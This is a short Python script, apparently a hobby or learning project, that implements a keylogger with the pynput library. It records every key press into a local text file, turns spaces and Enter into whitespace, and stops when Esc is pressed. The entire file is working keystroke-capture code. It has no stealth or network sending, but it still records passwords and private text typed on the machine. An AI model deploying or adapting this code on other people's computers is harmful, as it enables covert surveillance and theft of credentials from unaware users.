import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def write_register(keys):
    with open("Keylogger/register.txt","a") as register:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                register.write(" ")
            elif k.find("enter")> 0:
                register.write("\n")    
            elif k.find("Key.") == 0:
                register.write(" "+k+" ") 
            else:
                register.write(k)


                  

def on_press(key):
    global keys, count
    keys.append(key)
    count+=1
    write_register(keys)
    keys = []

def on_release(key):
    if(key == Key.esc):
        return False


with Listener(on_press = on_press, on_release = on_release) as listner:
    listner.join()